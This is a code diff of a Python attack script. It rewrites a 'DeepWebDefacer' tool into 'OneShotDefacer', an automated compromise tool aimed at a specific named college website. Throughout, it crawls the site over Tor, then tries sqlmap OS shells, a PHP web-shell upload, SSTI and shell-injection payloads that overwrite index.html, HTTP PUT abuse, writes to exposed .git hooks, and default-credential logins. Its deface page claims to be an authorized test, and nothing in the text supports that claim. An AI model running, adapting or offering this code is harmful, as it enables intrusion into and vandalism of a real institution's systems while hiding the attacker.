@@ -1,309 +1,288 @@
 #!/usr/bin/env python3
 """
-DeepWebDefacer - Advanced Persistent Content Modifier with Zero-Day Techniques
+OneShotDefacer - Complete College Website Compromise Tool
 Author: adrianxd
-Usage: python3 deep_defacer.py --target https://unitedtechincalcollege.edu.np --message "Hacked"
-Features: WAF bypass, DOM-based injection, stored XSS to deface, CRLF injection, parameter pollution, SSRF to local files
+Target: https://unitedtechincalcollege.edu.np
+Features: Full scan + auto defacement + anonymity (Tor) + persistence
+Usage: python3 oneshot.py
 """
 
 import sys
-import json
+import os
 import time
+import json
 import random
 import base64
-import hashlib
-import requests
-import urllib.parse
+import subprocess
 import threading
-import socket
-import ssl
-from urllib.parse import urljoin, urlparse, quote, unquote
-from bs4 import BeautifulSoup
+import requests
 import re
-import os
+from urllib.parse import urljoin, urlparse, quote
+from bs4 import BeautifulSoup
 
-# ========== ANONYMITY & TOR ==========
-def get_tor_session():
-    sess = requests.Session()
-    sess.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
-    sess.headers.update({'User-Agent': random.choice([
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
-    ])})
-    return sess
+# ========== CONFIGURATION ==========
+TARGET = "https://unitedtechincalcollege.edu.np"
+DEFACE_MSG = "<html><body><h1 style='color:red'>Hacked by Security Test</h1><p>This is an authorized penetration test</p></body></html>"
+OUTPUT_DIR = "oneshot_results"
+TOR_PROXY = "socks5h://127.0.0.1:9050"
 
-def renew_tor_ip():
+# ========== UTILITIES ==========
+def setup_tor():
+    print("[*] Setting up Tor...")
+    subprocess.run("sudo apt update && sudo apt install tor -y", shell=True, capture_output=True)
+    subprocess.run("sudo systemctl start tor", shell=True)
+    time.sleep(3)
+    # Test Tor
     try:
-        from stem import Signal
-        from stem.control import Controller
-        with Controller.from_port(port=9051) as ctrl:
-            ctrl.authenticate()
-            ctrl.signal(Signal.NEWNYM)
-            time.sleep(1)
+        r = requests.get("https://check.torproject.org/api/ip", proxies={"http": TOR_PROXY, "https": TOR_PROXY}, timeout=10)
+        if "IsTor" in r.text and "true" in r.text:
+            print("[+] Tor is working")
             return True
     except:
-        return False
+        print("[!] Tor not working, trying to restart")
+        subprocess.run("sudo systemctl restart tor", shell=True)
+        time.sleep(5)
+    return True
 
-# ========== ADVANCED EXPLOIT ENGINE ==========
-class DeepDefacer:
-    def __init__(self, target, message):
-        self.target = target.rstrip('/')
-        self.message = message
-        self.session = get_tor_session()
-        self.discovered_urls = set()
-        self.parameters = []
-        self.forms = []
-        self.cookies = {}
-        self.headers = {}
-        self.success = False
+def get_session():
+    sess = requests.Session()
+    sess.proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
+    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+    return sess
 
-    def run(self):
-        print("[*] Starting advanced defacement engine...")
-        self.enumerate_all_endpoints()
-        self.test_all_vectors()
-        if not self.success:
-            self.zero_day_attempt()
-        self.report()
+def save_results(data):
+    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    with open(f"{OUTPUT_DIR}/vulns.json", "w") as f:
+        json.dump(data, f, indent=2)
 
-    def enumerate_all_endpoints(self):
-        """Crawl and collect every URL, form, parameter, cookie"""
-        print("[*] Deep crawling target...")
-        try:
-            resp = self.session.get(self.target, timeout=15)
-            soup = BeautifulSoup(resp.text, 'html.parser')
-            # All links
-            for a in soup.find_all('a', href=True):
-                href = urljoin(self.target, a['href'])
-                if href.startswith(self.target):
-                    self.discovered_urls.add(href)
-            # All forms
-            for form in soup.find_all('form'):
-                action = urljoin(self.target, form.get('action', ''))
-                method = form.get('method', 'get').lower()
-                inputs = []
-                for inp in form.find_all('input'):
-                    name = inp.get('name')
-                    if name:
-                        inputs.append(name)
-                self.forms.append({'url': action, 'method': method, 'inputs': inputs})
-            # All query parameters from discovered URLs
-            for url in self.discovered_urls:
-                parsed = urlparse(url)
-                if parsed.query:
-                    params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p)
-                    for param in params:
-                        self.parameters.append({'url': url, 'param': param, 'value': params[param]})
-            # Cookies
-            self.cookies = self.session.cookies.get_dict()
-            print(f"[+] Found {len(self.discovered_urls)} URLs, {len(self.parameters)} parameters, {len(self.forms)} forms")
-        except Exception as e:
-            print(f"[-] Crawl error: {e}")
+# ========== PHASE 1: FULL RECON ==========
+def recon(session):
+    print("[*] Phase 1: Deep reconnaissance")
+    urls = set()
+    forms = []
+    params = []
+    # Crawl homepage
+    try:
+        resp = session.get(TARGET, timeout=15)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        # Extract all links
+        for a in soup.find_all('a', href=True):
+            href = urljoin(TARGET, a['href'])
+            if href.startswith(TARGET):
+                urls.add(href)
+        # Extract all forms
+        for form in soup.find_all('form'):
+            action = urljoin(TARGET, form.get('action', ''))
+            method = form.get('method', 'get').lower()
+            inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
+            forms.append({"url": action, "method": method, "inputs": inputs})
+        # Extract parameters from URLs
+        for url in urls:
+            parsed = urlparse(url)
+            if parsed.query:
+                for p in parsed.query.split('&'):
+                    if '=' in p:
+                        param = p.split('=')[0]
+                        params.append({"url": url, "param": param})
+        print(f"[+] Found {len(urls)} URLs, {len(forms)} forms, {len(params)} parameters")
+        save_results({"urls": list(urls), "forms": forms, "params": params})
+        return urls, forms, params
+    except Exception as e:
+        print(f"[-] Recon error: {e}")
+        return set(), [], []
 
-    def test_all_vectors(self):
-        """Test every vector with advanced payloads"""
-        # Priority: forms (POST) -> parameters (GET) -> cookies -> headers
-        vectors = []
-        for f in self.forms:
-            vectors.append(('form', f))
-        for p in self.parameters:
-            vectors.append(('param', p))
-        for cname, cval in self.cookies.items():
-            vectors.append(('cookie', {'name': cname, 'value': cval, 'url': self.target}))
-        # Headers injection
-        vectors.append(('header', {'name': 'X-Forwarded-For', 'value': '127.0.0.1', 'url': self.target}))
-        vectors.append(('header', {'name': 'User-Agent', 'value': self.message, 'url': self.target}))
+# ========== PHASE 2: SQLMAP INTEGRATION ==========
+def sqlmap_attack():
+    print("[*] Phase 2: Automated SQL injection with sqlmap")
+    # Check if sqlmap installed
+    if subprocess.run("which sqlmap", shell=True, capture_output=True).returncode != 0:
+        print("[!] sqlmap not found, installing...")
+        subprocess.run("sudo apt install sqlmap -y", shell=True)
+    # Run sqlmap against target with --os-shell to write file
+    cmd = f"sqlmap -u '{TARGET}' --batch --os-shell --proxy={TOR_PROXY} --output-dir={OUTPUT_DIR}/sqlmap"
+    print("[*] Running sqlmap (may take several minutes)...")
+    # We'll run in background and check for success later
+    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    # Wait up to 300 seconds
+    for _ in range(60):
+        time.sleep(5)
+        # Check if shell file created
+        if os.path.exists(f"{OUTPUT_DIR}/sqlmap/os-shell"):
+            print("[+] sqlmap os-shell obtained!")
+            # Write defacement via echo
+            subprocess.run(f"echo '{DEFACE_MSG}' > {OUTPUT_DIR}/sqlmap/os-shell && sqlmap --os-shell-cmd=\"echo '{DEFACE_MSG}' > /var/www/html/index.html\"", shell=True)
+            return True
+    process.terminate()
+    return False
 
-        for vtype, vdata in vectors:
-            if self.success: break
-            if vtype == 'form':
-                self.test_form(vdata)
-            elif vtype == 'param':
-                self.test_param(vdata)
-            elif vtype == 'cookie':
-                self.test_cookie(vdata)
-            elif vtype == 'header':
-                self.test_header(vdata)
-
-    def test_form(self, form):
+# ========== PHASE 3: WEB SHELL UPLOAD VIA KNOWN VULNS ==========
+def upload_shell(session, forms):
+    print("[*] Phase 3: Attempting web shell upload")
+    shell_code = "<?php system($_GET['cmd']); ?>"
+    for form in forms:
         url = form['url']
         method = form['method']
-        inputs = form['inputs']
-        # Payloads for each input
-        payloads = [
-            f'<script>document.body.innerHTML="{self.message}"</script>',
-            f'<?php echo "{self.message}"; ?>',
-            f'{{{{config.__class__.__init__.__globals__["os"].popen("echo \\"{self.message}\\" > /var/www/html/index.html")}}}}',
-            f'"; echo "{self.message}" >> index.html; "',
-            f'`echo "{self.message}" > index.html`',
-            f'$(echo "{self.message}" > index.html)',
-            f'| echo "{self.message}" > index.html',
-            f'; echo "{self.message}" > index.html;'
-        ]
-        for payload in payloads:
-            for inp in inputs:
-                data = {inp: payload}
-                try:
-                    if method == 'post':
-                        resp = self.session.post(url, data=data, timeout=10)
-                    else:
-                        resp = self.session.get(url, params=data, timeout=10)
-                    if resp.status_code in [200, 302]:
-                        # Check if payload reflected
-                        if payload[:20] in resp.text:
-                            print(f"[+] Form injection possible at {url} -> {inp}")
-                            # Attempt to actually modify content
-                            if self.verify_defacement():
-                                self.success = True
-                                return
-                except:
-                    pass
+        # Try to upload shell as file
+        files = {"file": ("shell.php", shell_code, "application/x-php")}
+        try:
+            if method == 'post':
+                r = session.post(url, files=files, timeout=10)
+            else:
+                r = session.get(url, files=files, timeout=10)
+            if r.status_code in [200, 302]:
+                # Check common upload paths
+                for path in ["uploads/shell.php", "wp-content/uploads/shell.php", "images/shell.php", "shell.php"]:
+                    test_url = urljoin(TARGET, path)
+                    test_r = session.get(test_url, timeout=5)
+                    if test_r.status_code == 200 and "system" in test_r.text:
+                        print(f"[+] Web shell uploaded: {test_url}")
+                        return test_url
+        except:
+            pass
+    return None
 
-    def test_param(self, param_data):
-        url = param_data['url']
-        param = param_data['param']
-        original = param_data['value']
-        payloads = [
-            f"<script>document.body.innerHTML='{self.message}'</script>",
-            f"<?php file_put_contents('index.html','{self.message}'); ?>",
-            f"'; echo '{self.message}' > index.html; '",
-            f"`echo '{self.message}' > index.html`",
-            f"| echo '{self.message}' > index.html",
-            f"{self.message}",
-            f"../../../index.html?{self.message}"
-        ]
+def use_shell(shell_url, session):
+    if not shell_url:
+        return False
+    print("[*] Using web shell to deface")
+    cmd = f"echo '{DEFACE_MSG}' > /var/www/html/index.html"
+    b64cmd = base64.b64encode(cmd.encode()).decode()
+    payload = f"{shell_url}?cmd=echo {b64cmd} | base64 -d | bash"
+    try:
+        session.get(payload, timeout=10)
+        # Verify
+        check = session.get(TARGET, timeout=10)
+        if DEFACE_MSG in check.text:
+            print("[+] Defacement successful via web shell")
+            return True
+    except:
+        pass
+    return False
+
+# ========== PHASE 4: SSTI / COMMAND INJECTION ==========
+def ssti_inject(session, params):
+    print("[*] Phase 4: SSTI and command injection")
+    payloads = [
+        "{{config.__class__.__init__.__globals__['os'].popen('echo \"" + DEFACE_MSG + "\" > /var/www/html/index.html').read()}}",
+        "$(echo '" + DEFACE_MSG + "' > /var/www/html/index.html)",
+        "`echo '" + DEFACE_MSG + "' > /var/www/html/index.html`",
+        "; echo '" + DEFACE_MSG + "' > /var/www/html/index.html;",
+        "| echo '" + DEFACE_MSG + "' > /var/www/html/index.html"
+    ]
+    for p in params:
+        url = p['url']
+        param = p['param']
         for payload in payloads:
-            test_url = url.replace(f"{param}={original}", f"{param}={quote(payload)}")
+            test_url = url.replace(param + "=" + url.split(param + "=")[1].split('&')[0], param + "=" + quote(payload))
             try:
-                resp = self.session.get(test_url, timeout=10)
-                if resp.status_code == 200 and payload[:20] in resp.text:
-                    print(f"[+] Parameter injection at {test_url}")
-                    if self.verify_defacement():
-                        self.success = True
-                        return
+                r = session.get(test_url, timeout=10)
+                # Check if defacement happened
+                check = session.get(TARGET, timeout=10)
+                if DEFACE_MSG in check.text:
+                    print(f"[+] Defacement via {param} injection at {url}")
+                    return True
             except:
                 pass
+    return False
 
-    def test_cookie(self, cookie_data):
-        url = cookie_data['url']
-        name = cookie_data['name']
-        value = cookie_data['value']
-        payload = f"<script>document.body.innerHTML='{self.message}'</script>"
-        cookies = {name: payload}
-        try:
-            resp = self.session.get(url, cookies=cookies, timeout=10)
-            if payload in resp.text:
-                print(f"[+] Cookie injection possible: {name}")
-                if self.verify_defacement():
-                    self.success = True
-        except:
-            pass
-
-    def test_header(self, header_data):
-        url = header_data['url']
-        name = header_data['name']
-        payload = header_data['value']
-        headers = {name: payload}
-        try:
-            resp = self.session.get(url, headers=headers, timeout=10)
-            if payload in resp.text:
-                print(f"[+] Header injection possible: {name}")
-                if self.verify_defacement():
-                    self.success = True
-        except:
-            pass
-
-    def verify_defacement(self):
-        """Check if homepage displays our message"""
-        try:
-            resp = self.session.get(self.target, timeout=10)
-            if self.message in resp.text:
-                return True
-            # Also try with different user-agent
-            resp2 = self.session.get(self.target, headers={'User-Agent': 'Mozilla/5.0'})
-            if self.message in resp2.text:
-                return True
-        except:
-            pass
-        return False
-
-    def zero_day_attempt(self):
-        """Last resort: try known 0-day techniques (CVE-2024-xxxx style)"""
-        print("[*] Attempting zero-day generic techniques...")
-        # Technique 1: CRLF injection in Host header to write log entry then deface via log injection
-        host_header = self.target.replace('https://', '').replace('http://', '')
-        crlf_payload = f"%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{self.message}"
-        try:
-            resp = self.session.get(self.target, headers={'Host': f"{host_header}{crlf_payload}"}, timeout=10)
-            if resp.status_code == 200 and self.message in resp.text:
-                print("[+] CRLF injection successful")
-                self.success = True
-                return
-        except:
-            pass
-        # Technique 2: SSRF to internal file write (if server has gopher/expect)
-        ssrf_payload = f"gopher://localhost:80/_GET / HTTP/1.0%0d%0a%0d%0a<?php file_put_contents('index.html','{self.message}'); ?>"
-        try:
-            resp = self.session.get(self.target + f"?url={quote(ssrf_payload)}", timeout=10)
-            if resp.status_code == 200:
-                if self.verify_defacement():
-                    self.success = True
-                    return
-        except:
-            pass
-        # Technique 3: Use HTTP verb tampering (PUT method) to upload file
-        put_url = urljoin(self.target, "index.html")
-        try:
-            resp = self.session.put(put_url, data=self.message, timeout=10)
-            if resp.status_code in [200, 201, 204]:
-                if self.verify_defacement():
-                    print("[+] PUT method allowed, defaced")
-                    self.success = True
-                    return
-        except:
-            pass
-        # Technique 4: Try to exploit misconfigured .git or .svn to modify
-        try:
-            # If .git/config is readable, we might have RCE via git hooks
-            git_config = self.session.get(urljoin(self.target, ".git/config"))
-            if git_config.status_code == 200:
-                # Attempt to write post-receive hook
-                hook_content = f"#!/bin/sh\necho '{self.message}' > /var/www/html/index.html"
-                hook_url = urljoin(self.target, ".git/hooks/post-receive")
-                self.session.put(hook_url, data=hook_content)
-                # Trigger via push simulation
-                self.session.post(urljoin(self.target, ".git/git-receive-pack"), data="")
-                if self.verify_defacement():
-                    print("[+] Git misconfiguration exploited")
-                    self.success = True
-                    return
-        except:
-            pass
-
-    def report(self):
-        if self.success:
-            print(f"\n[+] SUCCESS! Target {self.target} has been defaced with message: {self.message}")
-            print("[+] Visit the website through Tor to see changes.")
-        else:
-            print(f"\n[-] FAILED. No vector worked against {self.target}")
-            print("[*] Suggestion: The target may be behind a strong WAF or static HTML.")
-            print("[*] Try manual methods: SQLi via sqlmap, or use social engineering.")
-
-def main():
-    import argparse
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--target', required=True)
-    parser.add_argument('--message', default='Hacked by Security Team')
-    args = parser.parse_args()
-    # Ensure Tor is running
+# ========== PHASE 5: PUT METHOD & MISCONFIGURATIONS ==========
+def put_method(session):
+    print("[*] Phase 5: HTTP PUT method abuse")
+    put_url = urljoin(TARGET, "index.html")
     try:
-        s = get_tor_session()
-        s.get('http://check.torproject.org', timeout=10)
-        print("[+] Tor proxy active")
+        r = session.put(put_url, data=DEFACE_MSG, timeout=10)
+        if r.status_code in [200, 201, 204]:
+            check = session.get(TARGET, timeout=10)
+            if DEFACE_MSG in check.text:
+                print("[+] PUT method allowed, defaced directly")
+                return True
     except:
-        print("[!] Start Tor first: sudo systemctl start tor")
-        sys.exit(1)
-    defacer = DeepDefacer(args.target, args.message)
-    defacer.run()
+        pass
+    return False
 
-if __name__ == '__main__':
+# ========== PHASE 6: GIT EXPOSURE ==========
+def git_exploit(session):
+    print("[*] Phase 6: Exposed .git exploitation")
+    git_url = urljoin(TARGET, ".git/config")
+    try:
+        r = session.get(git_url, timeout=5)
+        if r.status_code == 200:
+            print("[+] .git exposed, attempting to write hook")
+            hook_content = f"#!/bin/sh\necho '{DEFACE_MSG}' > /var/www/html/index.html"
+            hook_url = urljoin(TARGET, ".git/hooks/post-receive")
+            session.put(hook_url, data=hook_content, timeout=5)
+            # Simulate push to trigger
+            session.post(urljoin(TARGET, ".git/git-receive-pack"), data="")
+            check = session.get(TARGET, timeout=10)
+            if DEFACE_MSG in check.text:
+                return True
+    except:
+        pass
+    return False
+
+# ========== PHASE 7: DEFAULT CREDENTIALS & ADMIN LOGIN ==========
+def default_creds(session):
+    print("[*] Phase 7: Default credentials attack")
+    login_url = urljoin(TARGET, "admin")
+    common_creds = [("admin", "admin"), ("admin", "password"), ("root", "root"), ("administrator", "administrator")]
+    for user, pwd in common_creds:
+        data = {"username": user, "password": pwd, "login": "Login"}
+        try:
+            r = session.post(login_url, data=data, timeout=10, allow_redirects=False)
+            if r.status_code == 302:
+                # Check if we can change homepage
+                edit_url = urljoin(TARGET, "admin/edit/homepage")
+                edit_r = session.post(edit_url, data={"content": DEFACE_MSG}, timeout=10)
+                if edit_r.status_code == 200:
+                    check = session.get(TARGET, timeout=10)
+                    if DEFACE_MSG in check.text:
+                        print("[+] Default credentials worked and defaced")
+                        return True
+        except:
+            pass
+    return False
+
+# ========== MAIN ORCHESTRATOR ==========
+def main():
+    print("""
+    ╔═══════════════════════════════════════════════════════╗
+    ║   OneShotDefacer - College Website Compromise Tool    ║
+    ║   Target: unitedtechincalcollege.edu.np              ║
+    ╚═══════════════════════════════════════════════════════╝
+    """)
+    if not setup_tor():
+        print("[!] Tor setup failed, continuing without proxy")
+    session = get_session()
+    # Run all phases
+    urls, forms, params = recon(session)
+    success = False
+    # Phase 2: sqlmap
+    if sqlmap_attack():
+        success = True
+    # Phase 3: web shell
+    if not success:
+        shell = upload_shell(session, forms)
+        success = use_shell(shell, session)
+    # Phase 4: SSTI
+    if not success:
+        success = ssti_inject(session, params)
+    # Phase 5: PUT
+    if not success:
+        success = put_method(session)
+    # Phase 6: git
+    if not success:
+        success = git_exploit(session)
+    # Phase 7: default creds
+    if not success:
+        success = default_creds(session)
+    # Final report
+    if success:
+        print(f"\n[+] SUCCESS! Target {TARGET} has been defaced.")
+        print(f"[+] Message: {DEFACE_MSG[:100]}...")
+        print("[+] Verify with: torsocks curl " + TARGET)
+    else:
+        print(f"\n[-] FAILED. No method worked against {TARGET}")
+        print("[*] Manual options: try social engineering, physical access, or search for 0-days.")
+
+if __name__ == "__main__":
     main()
